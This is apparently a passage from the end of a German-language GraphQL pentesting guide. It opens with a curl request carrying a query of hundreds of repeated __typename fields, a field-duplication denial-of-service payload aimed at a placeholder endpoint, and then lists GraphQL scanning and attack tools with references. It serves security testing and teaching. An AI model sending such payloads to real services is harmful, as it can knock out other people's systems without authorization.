-d '{"query": "query cop { __typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n} ", "operationName": "cop"}' \
'https://example.com/graphql'
```
## Tools

### Vulnerability scanners

- [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Testen Sie häufige Fehlkonfigurationen von GraphQL-Endpunkten
- [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): GraphQL-Sicherheitsprüfskript mit Fokus auf das Durchführen von Batch-GraphQL-Abfragen und -Mutationen.
- [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Fingerabdruck des verwendeten GraphQL
- [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Toolkit, das verwendet werden kann, um Schemata zu erfassen und nach sensiblen Daten zu suchen, Autorisierungen zu testen, Schemata zu brute-forcen und Pfade zu einem bestimmten Typ zu finden.
- [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Kann als Standalone oder [Burp-Erweiterung](https://github.com/doyensec/inql) verwendet werden.
- [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Kann auch als CLI-Client verwendet werden, um Angriffe zu automatisieren
- [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Tool, das die verschiedenen Möglichkeiten auflistet, **einen bestimmten Typ in einem GraphQL-Schema zu erreichen**.
- [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): Der Nachfolger von Standalone- und CLI-Modi von InQL
- [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Burp-Erweiterung für fortgeschrittenes GraphQL-Testing. Der _**Scanner**_ ist der Kern von InQL v5.0, wo Sie einen GraphQL-Endpunkt oder eine lokale Introspektionsschema-Datei analysieren können. Er generiert automatisch alle möglichen Abfragen und Mutationen und organisiert sie in einer strukturierten Ansicht für Ihre Analyse. Die _**Attacker**_-Komponente ermöglicht es Ihnen, Batch-GraphQL-Angriffe durchzuführen, was nützlich sein kann, um schlecht implementierte Ratenlimits zu umgehen.
- [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): Versuchen Sie, das Schema selbst bei deaktivierter Introspektion zu erhalten, indem Sie die Hilfe einiger GraphQL-Datenbanken in Anspruch nehmen, die die Namen von Mutationen und Parametern vorschlagen.

### Clients

- [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUI-Client
- [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUI-Client

### Automatic Tests

{{#ref}}
https://graphql-dashboard.herokuapp.com/
{{#endref}}

- Video, das AutoGraphQL erklärt: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## References

- [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
- [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
- [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
- [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
- [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

{{#include ../../banners/hacktricks-training.md}}
